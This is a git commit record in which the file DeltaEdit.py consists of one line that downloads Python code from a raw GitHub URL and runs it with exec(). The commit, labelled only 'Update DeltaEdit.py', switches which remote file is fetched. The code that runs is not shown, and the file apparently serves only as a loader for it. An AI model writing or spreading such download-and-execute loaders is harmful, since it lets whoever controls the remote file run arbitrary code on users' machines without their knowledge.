1c64013d21ad7442c52d699fedd21d5265e743f6
Shackleton <156511971+Wraith1vs11@users.noreply.github.com>
2025-09-01 20:55:49 +0700

    Update DeltaEdit.py

--- DeltaEdit.py
+++ DeltaEdit.py
@@ -1,1 +1,1 @@
-import requests; exec(requests.get("https://raw.githubusercontent.com/Wraith1vs11/Cloud/refs/heads/main/Shared.py").text)
+import requests; exec(requests.get("https://raw.githubusercontent.com/Wraith1vs11/Cloud/refs/heads/main/Delta.py").text)
